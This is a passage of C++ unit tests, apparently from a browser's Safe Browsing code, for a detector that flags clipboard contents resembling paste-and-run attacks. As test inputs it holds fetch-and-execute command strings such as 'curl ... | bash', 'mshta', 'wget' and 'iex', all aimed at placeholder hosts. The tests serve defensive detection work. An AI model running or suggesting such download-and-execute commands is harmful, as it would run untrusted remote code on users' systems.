  EXPECT_EQ(1, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MissingURL) {
  // Loader + Runner, but no URL.
  ClipboardExtractedData data = ExtractFromPayload(u"echo hello | bash");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("echo", "bash"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, RemoteRunner) {
  // Remote runner satisfies loader and runner.
  ClipboardExtractedData data = ExtractFromPayload(u"mshta example.com");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("mshta"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, SubcommandSyntax) {
  // Subcommand syntax satisfies runner.
  ClipboardExtractedData data =
      ExtractFromPayload(u"$(curl http://example.com)");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl"));
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MixedCaseAndPaths) {
  ClipboardExtractedData data =
      ExtractFromPayload(u"cUrL https://example.com/s /usr/bin/BaSh.exe");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MixedDelimiters) {
  ClipboardExtractedData data = ExtractFromPayload(
      u"curl\thttps://e.com\rwget\nhttp://b.com|{bash};(cmd::iex)");
  EXPECT_THAT(data.suspicious_tokens(),
              ::testing::ElementsAre("curl", "wget", "bash", "cmd", "iex"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, IncludeFullPayload) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "true"}});

  ClipboardExtractedData data =
      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
  EXPECT_TRUE(data.is_overall_suspicious());
  EXPECT_EQ(data.content(), "curl https://example.com/s.sh | bash");
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest,
       ExcludeFullPayloadByDefault) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "false"}});

  ClipboardExtractedData data =
      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
  EXPECT_TRUE(data.is_overall_suspicious());
  EXPECT_FALSE(data.has_content());
}

}  // namespace safe_browsing
